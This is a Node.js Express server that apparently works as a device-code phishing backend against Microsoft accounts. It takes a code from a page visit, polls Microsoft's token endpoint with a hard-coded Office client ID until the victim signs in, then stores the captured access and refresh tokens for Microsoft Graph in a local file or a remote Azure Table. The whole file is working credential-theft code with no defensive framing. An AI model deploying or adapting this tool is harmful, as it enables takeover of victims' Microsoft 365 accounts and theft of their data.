const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { TableServiceClient, AzureNamedKeyCredential, TableClient } = require("@azure/data-tables");
const { register } = require('module');
const { table } = require('console');


const port = process.env.PORT || 80
const token_file = process.env.token_file || "access_tokens.txt"

const accountName = process.env.TABLE_ACCOUNT_NAME
const accountKey = process.env.TABLE_ACCOUNT_KEY
const tableName = process.env.TABLE_NAME

const endpoint = `https://${accountName}.table.core.windows.net`

const credential = new AzureNamedKeyCredential(accountName, accountKey);
const tableServiceClient = new TableServiceClient(endpoint, credential);
// Create a table client
const tableClient = new TableClient(endpoint, tableName, credential);

const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Route to handle incoming requests with auth code
app.get('/', async (req, res) => {
    const authCode = req.query.code;

    if (!authCode) {
        return res.sendFile(path.join(__dirname, 'index.html'));
    }

    completeOAuthFlow(authCode)
        .then(() => res.send('OAuth flow initiated successfully'))
        .catch((err) => console.log(err));
});

// Function to sleep/wait for a specified duration asynchronously
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Function to complete OAuth flow asynchronously
async function completeOAuthFlow(authCode) {
    const tokenUrl = 'https://login.microsoftonline.com/common/oauth2/token?api-version=1.0';
    // const tokenUrl = 'https://httpbin.org/post'
    const formData = new URLSearchParams();
    formData.append('client_id', 'd3590ed6-52b3-4102-aeff-aad2292ab01c');
    formData.append('code', authCode);
    formData.append('grant_type', 'urn:ietf:params:oauth:grant-type:device_code');
    formData.append('resource', 'https://graph.microsoft.com');
    return new Promise((resolve, reject) => {
        let continue_flag = true;
        const processOAuth = async () => {
            try {
                while (continue_flag) {
                    const response = await axios.post(tokenUrl, formData, {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        validateStatus: () => true
                    });
                    if (response.status === 200) {
                        continue_flag = false;
                        const { access_token, refresh_token } = response.data;
                        const timestamp = new Date().toISOString();
                        const tokens = `\n\n[${timestamp}] Access Token: ${access_token}\n\n[${timestamp}] Refresh Token: ${refresh_token}\n`;
                        
                        if(tableName && accountName && accountKey){
                            // Define the entity to be added
                            const entityToAdd = {
                                partitionKey: "Partition",
                                rowKey: "Row",
                                AccessToken: access_token,
                                RefreshToken: refresh_token
                            };
                            tableClient.createEntity(entityToAdd)
                        }else{
                            fs.appendFile(token_file, tokens, (err) => {
                                if (err) reject(err);
                                console.log('Access tokens appended to access_tokens.txt');
                                resolve();
                            });
                        }
                    } else if (response.data.error) {
                        console.log("Oauth authorization pending...");
                        await sleep(3000);
                    } else {
                        console.log("[*] Oauth code processing failed, with status code:", response.status);
                        console.log(response.data.error_description);
                        continue_flag = false;
                        reject(new Error('OAuth code processing failed'));
                    }
                }
            } catch (error) {
                console.error('Error during OAuth flow:', error.message);
                reject(error);
            }
        };

        processOAuth();
    });        
}

// Start the JS server
app.listen(port, () => {
    console.log(`JS Server is running on http://localhost:${port}`);
});